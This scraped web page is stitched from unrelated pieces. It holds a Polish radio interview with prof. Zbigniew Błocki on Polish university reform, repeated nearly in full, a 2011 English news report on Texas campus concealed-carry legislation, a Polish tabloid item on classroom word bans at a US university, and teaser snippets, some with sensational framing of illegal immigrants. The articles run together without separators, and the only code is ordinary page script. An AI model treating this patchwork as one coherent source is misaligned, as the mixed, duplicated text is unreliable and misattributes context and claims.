  Zobaczymy. W tej chwili mogę powiedzieć, że ona aż tak daleko, jakbym chciał, nie pójdzie. Generalnie jednak - moim zdaniem - idzie w dobrym kierunku. Podoba mi się też sposób pracy nad nią, nie przez antagonizowanie środowiska, tylko rozmowę z nim. To, moim zdaniem, jest dobre. Ale trzeba sobie zdać sprawę, że każda dalej idąca reforma musi też być kontrowersyjna. Pewne bardziej zdecydowane kroki też są potrzebne. To nie jest łatwe także dla osób, które ostatecznie o tym tekście ustawy będą decydować, w tym wicepremiera Jarosława Gowina...
     Odtwarzacz wideo wymaga uruchomienia obsługi JavaScript w przeglądarce.  prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. III   try{jQuery(document).ready(function(){var obj = jQuery('#audioplayer_2387469');var cont = obj.html();if(cont) obj.html(cont.replace('Odtwarzacz audio wymaga uruchomienia obsługi JavaScript w przeglądarce.', 'Odtwarzacz audio wymaga uruchomienia wtyczki Adobe Flash Player w przeglądarce.'));});}catch(e){}
Porozmawiajmy o tym, co w tej reformie będzie odpowiadać temu, czego by pan chciał. Najpierw dobre wiadomości. 
  Myślę, że generalnie dobra jest ta idea, by ustrój uniwersytetu zmienić w taki sposób, by zarządzanie było bardziej czytelne, by rektor miał większą władzę, by oceniać uczelnię jako całość, nie poszczególne wydziały, czy jednostki podstawowe. Dobra jest próba zdefiniowania lepszych jednostek badawczych i ich finansowania w lepszym stopniu. To krok w dobrą stronę. Dobra jest też zmiana sposobu wyłaniania rektora, czy ogólnie władz uczelni. Ja wielokrotnie się na ten temat wypowiadałem, to zawsze była dla mnie sprawa kluczowa, by demokrację na uniwersytetach jednak ograniczyć. Może nie chodzi o to, by ją całkowicie zlikwidować, ale mam świadomość, że demokracja z nauką niestety nie ma wiele wspólnego. Mówię oczywiście tylko o uniwersytetach, nie o systemie politycznym kraju. Zresztą w krajach demokratycznych uniwersytety raczej w sposób demokratyczny nie funkcjonują. Z tego co wiem, w tym projekcie są takie rozwiązania, że będzie bodajże rada uczelni, która będzie takie postępowanie konkursowe prowadzić. Ale niestety ten element demokratyczny zostanie. Nie wiem w tej chwili, czy pójdzie to w takim kierunku, że rada będzie musiała przedstawić minimum dwóch kandydatów. Wtedy obawiam się, że pod tym względem zmiana nie będzie jakaś bardzo istotna.



Przemysł powinien finansować naukę, u nas często jest odwrotnie








W ciągu minionych lat bardzo dużo pieniędzy wydaliśmy w nauce na infrastrukturę, zaniedbaliśmy jednak samych naukowców, to musi się zmienić - mówi RMF FM prof. Zbigniew Błocki, nowy szef Narodowego Centrum Nauki. Jak podkreśla, na świecie sprawdza się model, w którym naukę finansuje przemysł,...                        czytaj więcej





gemius_hit("1vY7MmNUFJ.UuXkWFGL0i_VE.l2RwLtJ1Gzu1zTN65D.T7");
Jeśli mówimy o demokracji przy wyborze władz uczelni i autonomii uczelni, bo te sprawy się wiążą, to w czym widzi pan szanse? 
 W braku demokracji. Ja jestem absolutnie za autonomią uczelni, ale też za odpowiedzialnością. Jestem zwolennikiem systemu, który wspiera dobre jednostki, finansuje je w należyty sposób, ale jeśli jednostki źle działają, na przykład w instytutach badawczych te badania nie są na właściwym poziomie, doprowadza - no przepraszam - do ich likwidacji, czy gruntownej restrukturyzacji. Tak to jest na świecie. Dla mnie kwestia podstawowa jest taka, że władze uczelni muszą mieć motywację, by ta jakość była jak najwyższa. To niestety nie zawsze jest tożsame z interesem badaczy na uniwersytecie, czy też studentów, jako całej społeczności. 
To stanie się też w takim razie częścią odpowiedzialności instytucji, które powołują władze, rektora. Czyli ministra? 
  Nie. Rozumiem, że nie będzie rozwiązań w takim kierunku, by to minister powoływał rektora. Cała kontrowersja tu jest taka, że w jakiś sposób to jednak uczelnie mają same rektora wybierać, czy to demokratycznie, czy też przez konkurs przed wybraną komisją i tylko ten wybór zatwierdzać. Tak daleko, by to minister mianował, jak rozumiem żaden z pomysłów nie idzie. 
Ale czy uczelnie będą w stanie tego nadzoru ministra uniknąć? Czy takie rozwiązanie będzie realne? 
  Oczywiście minister musi mieć ważną rolę w nadzorze nad uniwersytetami i instytucjami badawczymi w tym sensie, że rząd decyduje o ich finansowaniu. Musi być odpowiedni system oceny, parametryzacji - choć to jest osobna kwestia - zawsze rola ministra będzie tu istotna, przede wszystkim przez wprowadzanie mechanizmów, które te jednostki zmotywują do lepszej jakości, większych starań o pozyskanie dobrych naukowców z zewnątrz. Takich mechanizmów jeszcze ciągle w Polsce nie widzę, bardzo tego - moim zdaniem - brakuje. To jest podstawa światowej nauki, że uczelnie, instytuty walczą o dobrych ludzi z zewnątrz. U nas ten system wygląda wciąż tak, że cała kariera przebiega na jednej uczelni. Jeśli zostaną wprowadzone rozwiązania, które stymulują poszukiwanie naukowców z zewnątrz, to jest moim zdaniem bardzo istotne. 
Wspomniał pan o pozycji rektorów uniwersytetów na zachodzie, ale tam ich silna pozycja i bardzo duża odpowiedzialność wiąże się z prywatnymi źródłami finansowania, które u nas praktycznie ciągle jeszcze nie istnieją... 
  To chyba różnie bywa, oczywiście te prywatne źródła finansowania są, ale podstawowe finansowanie uczelni zajmujących się badaniami podstawowymi to są pieniądze publiczne. I zawsze tak będzie. W systemie anglosaskim do tego dochodzą jeszcze pieniądze z czesnego, bardzo istotny element budżetu, co jak rozumiem w Polsce nie jest realne. Sądzę, że w Polsce poza może uczelniami technicznymi, nie ma widoków na to, by pieniądze prywatne były w najbliższych latach istotnym elementem finansowania. Natomiast w większym stopniu uczelnie powinny konkurować o środki europejskie. Tutaj bardzo źle wypadamy, to jest problem. 
Co jeszcze dobrego - pana zdaniem - ma szanse w tej reformie się zdarzyć? 
  Ja zakładam, że wiele rozwiązań będzie szło w kierunku odbiurokratyzowania pewnych mechanizmów i uproszczenia przepisów, na przykład w ścieżce kariery naukowej, jeśli chodzi o stopnie. Ja osobiście byłbym w ogóle za wprowadzeniem systemu anglosaskiego i zniesieniem habilitacji, a już szczególnie profesury tytularnej, ale tu opór środowiska jest ogromny i z tego co wiem ustawa ma zachować te stopnie...
     Odtwarzacz wideo wymaga uruchomienia obsługi JavaScript w przeglądarce.  prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. II   try{jQuery(document).ready(function(){var obj = jQuery('#audioplayer_2387467_no2');var cont = obj.html();if(cont) obj.html(cont.replace('Odtwarzacz audio wymaga uruchomienia obsługi JavaScript w przeglądarce.', 'Odtwarzacz audio wymaga uruchomienia wtyczki Adobe Flash Player w przeglądarce.'));});}catch(e){}
Ci, którzy mają habilitację woleliby, by inni też musieli ją mieć... 
  Nie wiem, prawdę mówiąc, jakie są tego motywacje. Z mojego punktu widzenia, jako osoby, która też trochę organizuje elementy współpracy międzynarodowej, to jest duży problem. To bowiem oznacza brak kompatybilności z nauką światową. By ściągnąć tu ludzi i zatrudnić na jakichś równoważnych stanowiskach formalnie wymagamy, by oni mieli habilitację, profesurę tytularną, gdzie przede wszystkim tego drugiego tytułu nigdzie na świecie nie ma. Widzę w tym problemy i liczę, że pewne sprawy z tym związane zostaną jakoś usprawnione i o pewne rzeczy będzie łatwiej. Liczę też, że w większym stopniu te decyzje dotyczące awansu będą uzależnione na przykład od pozyskiwania grantów. Z tego co wiem, rozwiązania mają iść w tym kierunku. 
To porozmawiajmy o pieniądzach, bo kieruje pan instytucją, która te granty oferuje, wybiera naukowców rokujących największe nadzieje i finansuje ich badania. Czy ta reforma, w kształcie w jakim pana zdaniem zostanie wprowadzona, pozwoli w bardziej efektywny sposób wykorzystywać te pieniądze, które w nauce są i te, które - miejmy nadzieję - jeszcze się w niej pojawią? 
  Tak, tu mam duże nadzieje. Ministerstwo zresztą już jeden bardzo dobry i dość radykalny krok zrobiło, to znaczy zmieniło algorytm dotacji dydaktycznej na uniwersytecie, który można zmienić tylko rozporządzeniem ministerialnym. Po raz pierwszy od ponad 20 lat odstąpiono od zasady, że im więcej, tym lepiej, że płacimy za każdego studenta, za każdego doktoranta. To doprowadziło do bardzo złych rzeczy. Dzięki temu nowemu algorytmowi dotacji pojawiły się elementy promujące jakość. Uczelniom już nie będzie się opłacało zbierać jak najwięcej studentów i doktorantów. To prowadziło momentami do bardzo dużych patologii. Jeśli chodzi o tę ustawę - z tego, co się orientuję - ma ona wprowadzić ujednolicenie dotacji, zaprzestanie dzielenia ich na dydaktyczną i naukową. To też, moim zdaniem, jest krok w dobrym kierunku.
Wspomniał pan o potrzebie odbiurokratyzowania nauki i dydaktyki na wyższych uczelniach, ale oczywiście muszą być mechanizmy kontroli, określania jaka jest wartość danej uczelni i na ile naukowcy wypełniają ich obowiązki. Czy tu mamy szansę na dobrą zmianę?
  Tu są dwie rzeczy, jedna z nich to parametryzacja, związana z działalnością naukową, a druga to jest akredytacja, sprawdzanie jakości działalności dydaktycznej. Jeśli chodzi o parametryzacje związaną z działalnością naukową, to dużą, negatywną cechą polskiego systemu jest jej zalgorytmizowanie i w zdecydowanej większości uzależnienie oceny jakości od takich algorytmicznych wzorów. Generalnie ten system w zbyt dużym stopniu wspierał ilość kosztem jakości. Ja osobiście jestem zdecydowanym zwolennikiem, jak się to dzieje za granicą, oceny eksperckiej, najlepiej tylko wybranych, najlepszych publikacji jednostki z jakiegoś okresu. Tu, moim zdaniem, zmiany mogłyby pójść dalej, z tego co wiem elementu eksperckiego będzie w tej ocenie więcej, ale ciągle ten element bibliometryczny, czy algorytmiczny zostanie. Mam nadzieję, że może w przyszłości te kroki w kierunku jeszcze bardziej zaawansowanej oceny ekspertów będziemy kontynuować. I tu chcę podkreślić, że za granicą te oceny są dokonywane właśnie przez ekspertów zagranicznych. Tego nam strasznie brakuje, właśnie oceniania naszej działalności naukowej, a szczególnie jednostek przez ekspertów zagranicznych. Jeśli chodzi o oceny samych badaczy to tu, choćby w NCN, z ekspertów zagranicznych korzystamy częściej...
A jeśli chodzi o dydaktykę?
  Tu, jak rozumiem, wiele rzeczy zostanie odbiurokratyzowanych, uczelnie będą miały większą swobodę, szczególnie te najlepsze, w otwieraniu nowych kierunków. To uważam za bardzo dobry ruch i zdecydowanie do tej pory tej biurokracji było za dużo. W większym stopniu rynek pracy powinien decydować o jakości tego wykształcenia, więcej powinno być elementów konkurencyjnych, rynkowych, by prestiż uniwersytetu się liczył, by te najlepsze uniwersytety miały w kształtowaniu programu dydaktycznego stosunkowo dużą swobodę.
Wspomniał pan, że reforma jest wprowadzana spokojnie. Czy dyskusja, która będzie się odbywać na samym Kongresie i potem, również będzie tak spokojna, czy spodziewa się pan jeszcze jakichś poważnych kontrowersji?
  Nie wiem. Na pewno trochę kontrowersji będzie, ale nie spodziewam się zażartych dyskusji. Myślę, że byłoby ich więcej, gdyby te zmiany były bardziej rewolucyjne. Mam nadzieję, że to nie jest ostatnia reforma polskiej nauki, że to się jednak będzie toczyć w kierunku większej konkurencyjności, większego finansowania jednostek najlepszych. I trzeba podkreślić, że za tymi reformami musi iść zdecydowanie większe finansowanie nauki. Cywilizacyjnie jest to dla nas niezbędne. Obie te rzeczy musza się dziać na raz i to zapewne jest proces na następnych kilkanaście lat.
Rozmawialiśmy poprzednio ponad dwa lata temu. To był taki czas, kiedy skuteczność ubiegania się o granty z NCN spadła, bodajże nawet do 16 procent. Nie wzrastała ilość pieniędzy, a przybywało kandydatów. W ciągu tych lat sytuacja finansowa się poprawiła, na ile wzrosła też skuteczność uzyskiwania grantów?
  To się zdecydowanie poprawiło i te zmiany zaczęły się jeszcze w 2015 roku. W przyszłym roku wydaje się, że będziemy mieli trzeci kolejny rok z wyraźnym wzrostem budżetu NCN, tym razem o około 100 milionów złotych. W efekcie ten współczynnik, który wtedy wynosił około 16 procent, teraz we wszystkich konkursach sięga 30 procent. To jest zresztą optymalny współczynnik, którego nie chcemy zwiększać. Chcemy zachować konkurencyjność tego systemu, a dzięki tym zwiększonym funduszom możemy też finansować dodatkowe inicjatywy. Muszę powiedzieć, że obecnie dzięki decyzjom ministerstwa i rządu sytuacja finansowa NCN jest bardzo dobra. Zaczęło się to już przed wyborami, za poprzedniego rządu, i jest to kontynuowane przez ministerstwo kierowane przez premiera Gowina. 
     Odtwarzacz wideo wymaga uruchomienia obsługi JavaScript w przeglądarce.  prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. I   try{jQuery(document).ready(function(){var obj = jQuery('#audioplayer_2387460_no3');var cont = obj.html();if(cont) obj.html(cont.replace('Odtwarzacz audio wymaga uruchomienia obsługi JavaScript w przeglądarce.', 'Odtwarzacz audio wymaga uruchomienia wtyczki Adobe Flash Player w przeglądarce.'));});}catch(e){}
(ph)

Grzegorz Jasiński

Grzegorz Jasiński: Panie profesorze, jesteśmy w przededniu Narodowego Kongresu Nauki, ogłoszenia konkretnych propozycji, a nawet projektu reform w polskiej nauce i szkolnictwie wyższym. Na co pan liczy?Prof. Zbigniew Błocki: Przede wszystkim muszę powiedzieć, że od wielu lat uważałem i dawałem temu wyraz publicznie, że taka porządna reforma polskiego systemu nauki jest bardzo potrzebna... Czy to będzie porządna reforma?   Zobaczymy. W tej chwili mogę powiedzieć, że ona aż tak daleko, jakbym chciał, nie pójdzie. Generalnie jednak - moim zdaniem - idzie w dobrym kierunku. Podoba mi się też sposób pracy nad nią, nie przez antagonizowanie środowiska, tylko rozmowę z nim. To, moim zdaniem, jest dobre. Ale trzeba sobie zdać sprawę, że każda dalej idąca reforma musi też być kontrowersyjna. Pewne bardziej zdecydowane kroki też są potrzebne. To nie jest łatwe także dla osób, które ostatecznie o tym tekście ustawy będą decydować, w tym wicepremiera Jarosława Gowina...prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. IIIPorozmawiajmy o tym, co w tej reformie będzie odpowiadać temu, czego by pan chciał. Najpierw dobre wiadomości.   Myślę, że generalnie dobra jest ta idea, by ustrój uniwersytetu zmienić w taki sposób, by zarządzanie było bardziej czytelne, by rektor miał większą władzę, by oceniać uczelnię jako całość, nie poszczególne wydziały, czy jednostki podstawowe. Dobra jest próba zdefiniowania lepszych jednostek badawczych i ich finansowania w lepszym stopniu. To krok w dobrą stronę. Dobra jest też zmiana sposobu wyłaniania rektora, czy ogólnie władz uczelni. Ja wielokrotnie się na ten temat wypowiadałem, to zawsze była dla mnie sprawa kluczowa, by demokrację na uniwersytetach jednak ograniczyć. Może nie chodzi o to, by ją całkowicie zlikwidować, ale mam świadomość, że demokracja z nauką niestety nie ma wiele wspólnego. Mówię oczywiście tylko o uniwersytetach, nie o systemie politycznym kraju. Zresztą w krajach demokratycznych uniwersytety raczej w sposób demokratyczny nie funkcjonują. Z tego co wiem, w tym projekcie są takie rozwiązania, że będzie bodajże rada uczelni, która będzie takie postępowanie konkursowe prowadzić. Ale niestety ten element demokratyczny zostanie. Nie wiem w tej chwili, czy pójdzie to w takim kierunku, że rada będzie musiała przedstawić minimum dwóch kandydatów. Wtedy obawiam się, że pod tym względem zmiana nie będzie jakaś bardzo istotna.W ciągu minionych lat bardzo dużo pieniędzy wydaliśmy w nauce na infrastrukturę, zaniedbaliśmy jednak samych naukowców, to musi się zmienić - mówi RMF FM prof. Zbigniew Błocki, nowy szef Narodowego Centrum Nauki. Jak podkreśla, na świecie sprawdza się model, w którym naukę finansuje przemysł,...                        czytaj więcej
Jeśli mówimy o demokracji przy wyborze władz uczelni i autonomii uczelni, bo te sprawy się wiążą, to w czym widzi pan szanse?  W braku demokracji. Ja jestem absolutnie za autonomią uczelni, ale też za odpowiedzialnością. Jestem zwolennikiem systemu, który wspiera dobre jednostki, finansuje je w należyty sposób, ale jeśli jednostki źle działają, na przykład w instytutach badawczych te badania nie są na właściwym poziomie, doprowadza - no przepraszam - do ich likwidacji, czy gruntownej restrukturyzacji. Tak to jest na świecie. Dla mnie kwestia podstawowa jest taka, że władze uczelni muszą mieć motywację, by ta jakość była jak najwyższa. To niestety nie zawsze jest tożsame z interesem badaczy na uniwersytecie, czy też studentów, jako całej społeczności. To stanie się też w takim razie częścią odpowiedzialności instytucji, które powołują władze, rektora. Czyli ministra?   Nie. Rozumiem, że nie będzie rozwiązań w takim kierunku, by to minister powoływał rektora. Cała kontrowersja tu jest taka, że w jakiś sposób to jednak uczelnie mają same rektora wybierać, czy to demokratycznie, czy też przez konkurs przed wybraną komisją i tylko ten wybór zatwierdzać. Tak daleko, by to minister mianował, jak rozumiem żaden z pomysłów nie idzie. Ale czy uczelnie będą w stanie tego nadzoru ministra uniknąć? Czy takie rozwiązanie będzie realne?   Oczywiście minister musi mieć ważną rolę w nadzorze nad uniwersytetami i instytucjami badawczymi w tym sensie, że rząd decyduje o ich finansowaniu. Musi być odpowiedni system oceny, parametryzacji - choć to jest osobna kwestia - zawsze rola ministra będzie tu istotna, przede wszystkim przez wprowadzanie mechanizmów, które te jednostki zmotywują do lepszej jakości, większych starań o pozyskanie dobrych naukowców z zewnątrz. Takich mechanizmów jeszcze ciągle w Polsce nie widzę, bardzo tego - moim zdaniem - brakuje. To jest podstawa światowej nauki, że uczelnie, instytuty walczą o dobrych ludzi z zewnątrz. U nas ten system wygląda wciąż tak, że cała kariera przebiega na jednej uczelni. Jeśli zostaną wprowadzone rozwiązania, które stymulują poszukiwanie naukowców z zewnątrz, to jest moim zdaniem bardzo istotne. Wspomniał pan o pozycji rektorów uniwersytetów na zachodzie, ale tam ich silna pozycja i bardzo duża odpowiedzialność wiąże się z prywatnymi źródłami finansowania, które u nas praktycznie ciągle jeszcze nie istnieją...   To chyba różnie bywa, oczywiście te prywatne źródła finansowania są, ale podstawowe finansowanie uczelni zajmujących się badaniami podstawowymi to są pieniądze publiczne. I zawsze tak będzie. W systemie anglosaskim do tego dochodzą jeszcze pieniądze z czesnego, bardzo istotny element budżetu, co jak rozumiem w Polsce nie jest realne. Sądzę, że w Polsce poza może uczelniami technicznymi, nie ma widoków na to, by pieniądze prywatne były w najbliższych latach istotnym elementem finansowania. Natomiast w większym stopniu uczelnie powinny konkurować o środki europejskie. Tutaj bardzo źle wypadamy, to jest problem. Co jeszcze dobrego - pana zdaniem - ma szanse w tej reformie się zdarzyć?   Ja zakładam, że wiele rozwiązań będzie szło w kierunku odbiurokratyzowania pewnych mechanizmów i uproszczenia przepisów, na przykład w ścieżce kariery naukowej, jeśli chodzi o stopnie. Ja osobiście byłbym w ogóle za wprowadzeniem systemu anglosaskiego i zniesieniem habilitacji, a już szczególnie profesury tytularnej, ale tu opór środowiska jest ogromny i z tego co wiem ustawa ma zachować te stopnie...prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. IICi, którzy mają habilitację woleliby, by inni też musieli ją mieć...   Nie wiem, prawdę mówiąc, jakie są tego motywacje. Z mojego punktu widzenia, jako osoby, która też trochę organizuje elementy współpracy międzynarodowej, to jest duży problem. To bowiem oznacza brak kompatybilności z nauką światową. By ściągnąć tu ludzi i zatrudnić na jakichś równoważnych stanowiskach formalnie wymagamy, by oni mieli habilitację, profesurę tytularną, gdzie przede wszystkim tego drugiego tytułu nigdzie na świecie nie ma. Widzę w tym problemy i liczę, że pewne sprawy z tym związane zostaną jakoś usprawnione i o pewne rzeczy będzie łatwiej. Liczę też, że w większym stopniu te decyzje dotyczące awansu będą uzależnione na przykład od pozyskiwania grantów. Z tego co wiem, rozwiązania mają iść w tym kierunku. To porozmawiajmy o pieniądzach, bo kieruje pan instytucją, która te granty oferuje, wybiera naukowców rokujących największe nadzieje i finansuje ich badania. Czy ta reforma, w kształcie w jakim pana zdaniem zostanie wprowadzona, pozwoli w bardziej efektywny sposób wykorzystywać te pieniądze, które w nauce są i te, które - miejmy nadzieję - jeszcze się w niej pojawią?   Tak, tu mam duże nadzieje. Ministerstwo zresztą już jeden bardzo dobry i dość radykalny krok zrobiło, to znaczy zmieniło algorytm dotacji dydaktycznej na uniwersytecie, który można zmienić tylko rozporządzeniem ministerialnym. Po raz pierwszy od ponad 20 lat odstąpiono od zasady, że im więcej, tym lepiej, że płacimy za każdego studenta, za każdego doktoranta. To doprowadziło do bardzo złych rzeczy. Dzięki temu nowemu algorytmowi dotacji pojawiły się elementy promujące jakość. Uczelniom już nie będzie się opłacało zbierać jak najwięcej studentów i doktorantów. To prowadziło momentami do bardzo dużych patologii. Jeśli chodzi o tę ustawę - z tego, co się orientuję - ma ona wprowadzić ujednolicenie dotacji, zaprzestanie dzielenia ich na dydaktyczną i naukową. To też, moim zdaniem, jest krok w dobrym kierunku.Wspomniał pan o potrzebie odbiurokratyzowania nauki i dydaktyki na wyższych uczelniach, ale oczywiście muszą być mechanizmy kontroli, określania jaka jest wartość danej uczelni i na ile naukowcy wypełniają ich obowiązki. Czy tu mamy szansę na dobrą zmianę?  Tu są dwie rzeczy, jedna z nich to parametryzacja, związana z działalnością naukową, a druga to jest akredytacja, sprawdzanie jakości działalności dydaktycznej. Jeśli chodzi o parametryzacje związaną z działalnością naukową, to dużą, negatywną cechą polskiego systemu jest jej zalgorytmizowanie i w zdecydowanej większości uzależnienie oceny jakości od takich algorytmicznych wzorów. Generalnie ten system w zbyt dużym stopniu wspierał ilość kosztem jakości. Ja osobiście jestem zdecydowanym zwolennikiem, jak się to dzieje za granicą, oceny eksperckiej, najlepiej tylko wybranych, najlepszych publikacji jednostki z jakiegoś okresu. Tu, moim zdaniem, zmiany mogłyby pójść dalej, z tego co wiem elementu eksperckiego będzie w tej ocenie więcej, ale ciągle ten element bibliometryczny, czy algorytmiczny zostanie. Mam nadzieję, że może w przyszłości te kroki w kierunku jeszcze bardziej zaawansowanej oceny ekspertów będziemy kontynuować. I tu chcę podkreślić, że za granicą te oceny są dokonywane właśnie przez ekspertów zagranicznych. Tego nam strasznie brakuje, właśnie oceniania naszej działalności naukowej, a szczególnie jednostek przez ekspertów zagranicznych. Jeśli chodzi o oceny samych badaczy to tu, choćby w NCN, z ekspertów zagranicznych korzystamy częściej...A jeśli chodzi o dydaktykę?  Tu, jak rozumiem, wiele rzeczy zostanie odbiurokratyzowanych, uczelnie będą miały większą swobodę, szczególnie te najlepsze, w otwieraniu nowych kierunków. To uważam za bardzo dobry ruch i zdecydowanie do tej pory tej biurokracji było za dużo. W większym stopniu rynek pracy powinien decydować o jakości tego wykształcenia, więcej powinno być elementów konkurencyjnych, rynkowych, by prestiż uniwersytetu się liczył, by te najlepsze uniwersytety miały w kształtowaniu programu dydaktycznego stosunkowo dużą swobodę.Wspomniał pan, że reforma jest wprowadzana spokojnie. Czy dyskusja, która będzie się odbywać na samym Kongresie i potem, również będzie tak spokojna, czy spodziewa się pan jeszcze jakichś poważnych kontrowersji?  Nie wiem. Na pewno trochę kontrowersji będzie, ale nie spodziewam się zażartych dyskusji. Myślę, że byłoby ich więcej, gdyby te zmiany były bardziej rewolucyjne. Mam nadzieję, że to nie jest ostatnia reforma polskiej nauki, że to się jednak będzie toczyć w kierunku większej konkurencyjności, większego finansowania jednostek najlepszych. I trzeba podkreślić, że za tymi reformami musi iść zdecydowanie większe finansowanie nauki. Cywilizacyjnie jest to dla nas niezbędne. Obie te rzeczy musza się dziać na raz i to zapewne jest proces na następnych kilkanaście lat.Rozmawialiśmy poprzednio ponad dwa lata temu. To był taki czas, kiedy skuteczność ubiegania się o granty z NCN spadła, bodajże nawet do 16 procent. Nie wzrastała ilość pieniędzy, a przybywało kandydatów. W ciągu tych lat sytuacja finansowa się poprawiła, na ile wzrosła też skuteczność uzyskiwania grantów?  To się zdecydowanie poprawiło i te zmiany zaczęły się jeszcze w 2015 roku. W przyszłym roku wydaje się, że będziemy mieli trzeci kolejny rok z wyraźnym wzrostem budżetu NCN, tym razem o około 100 milionów złotych. W efekcie ten współczynnik, który wtedy wynosił około 16 procent, teraz we wszystkich konkursach sięga 30 procent. To jest zresztą optymalny współczynnik, którego nie chcemy zwiększać. Chcemy zachować konkurencyjność tego systemu, a dzięki tym zwiększonym funduszom możemy też finansować dodatkowe inicjatywy. Muszę powiedzieć, że obecnie dzięki decyzjom ministerstwa i rządu sytuacja finansowa NCN jest bardzo dobra. Zaczęło się to już przed wyborami, za poprzedniego rządu, i jest to kontynuowane przez ministerstwo kierowane przez premiera Gowina. prof. Zbigniew Błocki o reformie szkolnictwa wyższego, cz. I(ph)Nie przegap ważnej informacjiSkorzystaj z naszego bota >>   Korzystanie z portalu oznacza akceptację Regulaminu. Polityka Cookies. Prywatność. Copyright by Radio Muzyka Fakty Grupa RMF sp. z o.o. sp. k. 2009-2018. Wszystkie prawa zastrzeżone.
					Aby czytać nasze artykuły wyłącz AdBlocka/uBlocka lub dodaj wyjątek
					dla naszej domeny - zobacz
						jak to zrobić.
				Spokojnie, dodanie wyjątku nie wyłączy
					blokowania reklam.Nieznany błąd - nie można wyświetlić stronyAssociated Press

Tue 10 May 2011 08.21 BST


First published on Tue 10 May 2011 08.21 BST

The holders of concealed handgun licences are set to be allowed to carry weapons into public college buildings and classrooms in Texas, after Republicans in the state senate approved the measure as part of a universities spending bill.Republican senator Jeff Wentworth had been unable to gain the votes he needed to pass the issue as its own bill after it met stiff resistance from higher education officials, particularly from within the University of Texas UT-System.The senate's 12 Democrats had mostly worked together to block the measure but were powerless to stop it on Monday when a majority in the 31-member chamber got it added to the spending bill as an amendment.Supporters hope the vote will help push the measure past a roadblock in the house, where a similar bill has been stuck without a vote in that chamber with just a few weeks left in the legislative term."Campus carry has more momentum than a runaway freight train," said Scott Lewis of Students for Concealed Carry, a nationwide group backing the measure.Supporters call it a self-defence and guns rights issue. UT-System chancellor, Francisco Cigarroa, wrote to politicians and Governor Rick Perry outlining concerns that the measure will lead to more campus crime and suicides.Hearings were dominated by testimony from supporters who had been raped or assaulted on college campuses, and several people who had survived the 2007 mass shooting at Virginia Tech University when a gunman killed 32 people.Democratic senator Judith Zaffirini, who was a student at the University of Texas in 1966 when sniper Charles Whitman killed 12 people and wounded dozens of others, argued against the bill. She predicted mass chaos if police responded to a call and found several people with guns drawn."I can't imagine the horrors if this passes," Zaffirini said.Wentworth, recalling the shooting at Virginia Tech, said he wanted to give students a chance to defend themselves."There was no one there to defend themselves in a gun-free zone that was a victim-rich zone," he said. "I'm trying to avoid that type of situation."Texas passed its concealed handgun licence law in 1995. Licence holders must be at least 21 and pass a training course.Guns on campus bills have been rejected in at least 23 states since 2007. The bill originally covered private universities, but was changed to cover only public institutions of higher education. The senate rejected attempts to allow university boards of regents to decide gun policy on their campuses.Concealed handgun licence holders in Texas are allowed to skip metal detectors in the state capitol,. Perry made headlines for shooting a coyote on a morning jog last year.Earlier on Monday, senators voted to allow themselves to carry concealed handguns into places the rest of the public cannot, such as churches, restaurants and sporting events.Perry has said he supports the campus guns measure and is expected to sign it into law if it reaches his desk.Redakcja PolishExpressWykładowcy na amerykańskim uniwersytecie oświadczyli swoim studentom, że nie będą tolerować używania przez nich na zajęciach „opresyjnego czy nienawistnego języka”. Wśród słów zakazanych znalazło się m.in. określenie „nielegalny imigrant”.Restrykcje dotyczące języka używanego przez studentów zostały wprowadzone na Washington State University, a zakazem objęto m.in. takie określenia jak „The Man”, „Coloured People” i „Illegals/Illegal Aliens”. Tym, którzy nie zastosują się do wytycznych, grozi nawet niezaliczenie semestru. Restrykcje zostały przedstawione przez konkretnych profesorów, którzy twierdzą, że wymienione określenia są „opresyjne i nienawistne”. Profesor Selena Lester Breikss prowadząca kurs „Women & Popular Culture” oświadczyła, że „generalizacje, stereotypy oraz obraźliwy i opresyjny język nie będzie akceptowany na jej zajęciach”. Ponadto Breikss zabroniła używania na swoim kursie takich określeń jak „mężczyzna” i „kobieta”.Przeczytaj też: Nadzwyczajne spotkanie w Brukseli w sprawie kryzysu imigracyjnego„Językowe zakazy” wydała również profesor Rebecca Fowler prowadząca kurs „Introduction to Comparative Ethics Studies”. Podkreśliła ona, że używanie „niewłaściwego słownictwa” będzie miało wpływ na oceny studentów. Zakazanymi słowami na jej zajęciach są „coloured”, „the white man” i „illegals”. Co ciekawe według Flower słowo „nielegalny” (illegal) powinno opisywać nie osobę, ale działania, dlatego „nielegalni” w odniesieniu do osób jest niewłaściwe i opresyjne.  (BM) 
Chcesz na bieżąco czytać o wydarzeniach w UK? Pobierz aplikację Polish Express News na Androida
i iOS.
Materiał chroniony prawem autorskim. Kopiowanie i publikowanie wyłącznie za zgodą wydawcy. 
Na uniwersytecie w Anglii Wschodniej zmęczeni i zaspani studenci mogą uciąć sobie krótką drzemkę w specjalnie przeznaczonym do tego pomieszczeniu wyposażonym w poduszki i kamery CCTV.
Pomysł nie jest...

Prawie 200 studentów przystąpiło w sobotę do egzaminu z prawa kryminalnego na Uniwersytecie w Cambridge, podczas którego opisy przestępstw seksualnych stawały się wyjątkowo sugestywne i przez większość...

Turyści wypoczywający na Playa de los Alemanes w osłupieni obserwowali jak nielegalni imigranci przypuszczają desant na plaży w południowej części Hiszpanii.

Francuska policja jest bezsilna wobec „angielskiej mafii”, która jest podejrzana o przemyt nielegalnych imigrantów. Nie może przeprowadzić aresztowań z powodu niewystarczających dowodów.
Setki zdesperowanych...

Handlarze ludźmi coraz częściej korzystają z portów, w których panuje duży ruch, by przemycać nielegalnych imigrantów do Wielkiej Brytanii. Od zdesperowanych biorą nawet po 13,500 funtów, ujawniła National...

Media niejednokrotnie informowały w ostatnim czasie o ekstremizmie islamskim rozwijającym się na kampusach brytyjskich uniwersytetów. Nie były to bezpodstawne doniesienia. Pracownicy tych placówek mają...

Analiza preferencji wyborczych wśród studentów prowadzona od 1997 roku do chwili obecnej wskazuje, że to właśnie ze zdaniem żaków partyjni liderzy powinni liczyć się najbardziej.
Jak wynika z badan, na...

Brytyjska służba zdrowia ugina się pod ciężarem wykorzystujących go nielegalnych imigrantów. A zwykli pacjenci muszą za to płacić.
Na barkach brytyjskiego społeczeństwa spoczywa ciężar finansowania opieki...

14% świeżo upieczonych studentów przyznaje, że nie wie nawet, jak ugotować jajko. Czyżby byli tak „nieogarnięci”?

